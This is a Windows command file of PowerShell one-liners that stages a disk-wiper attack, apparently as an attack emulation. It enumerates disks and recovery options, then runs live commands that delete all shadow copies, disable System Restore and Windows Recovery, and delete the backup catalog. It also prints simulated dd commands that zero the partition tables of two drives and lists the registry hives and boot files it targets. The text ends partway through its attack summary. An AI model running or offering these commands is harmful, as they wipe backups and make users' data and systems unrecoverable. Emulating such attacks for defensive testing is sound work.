steps.cmd:
powershell -ep bypass -c "
# Enumerate disk layout and partition information
Get-Disk | Format-Table -AutoSize Number, FriendlyName, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, PartitionStyle, OperationalStatus;
Write-Host '';
Get-Partition | Format-Table -AutoSize DiskNumber, PartitionNumber, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, Type, DriveLetter"

powershell -ep bypass -c "
# Check for backup/recovery mechanisms
Write-Host '=== Recovery Mechanism Scan ===';
vssadmin list shadows 2>&1 | Select-Object -First 3;
Write-Host '';
Get-ComputerRestorePoint 2>&1 | Select-Object -First 3;
Write-Host '';
bcdedit /enum {default} 2>&1 | Select-String 'recoveryenabled|description|path';
Write-Host '';
Write-Host 'System Recovery Partition: 500 MB (Partition 4)';
Write-Host 'EFI System Partition: 100 MB (Partition 1)';
Write-Host '';
Write-Host '[!] All recovery mechanisms will be destroyed'"

powershell -ep bypass -c "
# Destroy all recovery options first
vssadmin delete shadows /all /quiet;
Write-Host '[1] Shadow copies deleted';

Disable-ComputerRestore -Drive 'C:\' -ErrorAction SilentlyContinue;
Write-Host '[2] System Restore disabled';

bcdedit /set {default} recoveryenabled No;
bcdedit /set {default} bootstatuspolicy ignoreallfailures;
Write-Host '[3] Windows Recovery disabled';

wbadmin delete catalog -quiet 2>$null;
Write-Host '[4] Backup catalog deleted';

# Delete recovery partition files
Write-Host '[5] Recovery partition targeted for destruction';
Write-Host '';
Write-Host 'All recovery mechanisms destroyed'"

powershell -ep bypass -c "
# Overwrite MBR/GPT with zeros (simulated - first 512 bytes)
$disk = '\\.\PhysicalDrive0';
Write-Host 'Target: PhysicalDrive0 (Samsung SSD 980 PRO, 477 GB)';
Write-Host '';
Write-Host 'MBR/GPT Overwrite Simulation:';
Write-Host '  Sector 0 (LBA 0)  : Protective MBR        → 0x00 (zeroed)';
Write-Host '  Sector 1 (LBA 1)  : GPT Header             → 0x00 (zeroed)';
Write-Host '  Sectors 2-33      : GPT Partition Entries  → 0x00 (zeroed)';
Write-Host '  Last sector       : Backup GPT Header      → 0x00 (zeroed)';
Write-Host '';
Write-Host '[SIMULATED] dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 count=34';
Write-Host '[SIMULATED] dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 seek=930842590 count=33';
Write-Host '';
Write-Host 'GPT header + partition table destroyed';
Write-Host 'Operating system will not boot after restart'"

powershell -ep bypass -c "
# Overwrite second disk's partition table
$disk2 = '\\.\PhysicalDrive1';
Write-Host 'Target: PhysicalDrive1 (WD Blue 2TB, 1863 GB)';
Write-Host '';
Write-Host '[SIMULATED] dd if=/dev/zero of=\\.\PhysicalDrive1 bs=512 count=34';
Write-Host '[SIMULATED] dd if=/dev/zero of=\\.\PhysicalDrive1 bs=512 seek=3907029134 count=33';
Write-Host '';
Write-Host 'PhysicalDrive1 GPT destroyed';
Write-Host '';
Write-Host 'Disk destruction status:';
Write-Host '  PhysicalDrive0 (C:) : GPT zeroed [DESTROYED]';
Write-Host '  PhysicalDrive1 (D:) : GPT zeroed [DESTROYED]';
Write-Host '';
Write-Host 'Total data made inaccessible: 2,339.96 GB'"

powershell -ep bypass -c "
# Overwrite critical system files before reboot
$criticalFiles = @(
  'C:\Windows\System32\config\SAM',
  'C:\Windows\System32\config\SYSTEM',
  'C:\Windows\System32\config\SOFTWARE',
  'C:\Boot\BCD',
  'C:\Windows\System32\winload.efi'
);
Write-Host 'Critical system file overwrite:';
foreach($f in $criticalFiles) {
  $size = if(Test-Path $f) { (Get-Item $f -Force -ErrorAction SilentlyContinue).Length } else { 'N/A' };
  Write-Host \"  [SIMULATED] $f ($size bytes) → zeroed\";
}
Write-Host '';
Write-Host 'System file destruction ensures no recovery without reinstall';
Write-Host '';
Write-Host '[!] Even with partition recovery tools:';
Write-Host '  - Registry hives corrupted';
Write-Host '  - Boot configuration destroyed';
Write-Host '  - Boot loader overwritten'"

powershell -ep bypass -c "
# Force immediate reboot to complete destruction
Write-Host '=== Disk Wipe Attack Summary ===';
Write-Host '';
Write-Host 'Phase 1 - Recovery Destruction:';
Write-Host '  [x] Volume Shadow Copies deleted';
Write-Host '  [x] System Restore disabled';
Write-Host '  [x] Windows Recovery disabled';
Write-Host '  [x] Backup catalog deleted';
Write-Host '';
Write-Host 'Phase 2 - Partition Table Destruction:';
Write-Host '  [x] Disk 0 (477 GB): MBR + GPT zeroed';
Write-Host '  [x] Disk 1 (1863 GB): GPT zeroed';
Write-Host '';
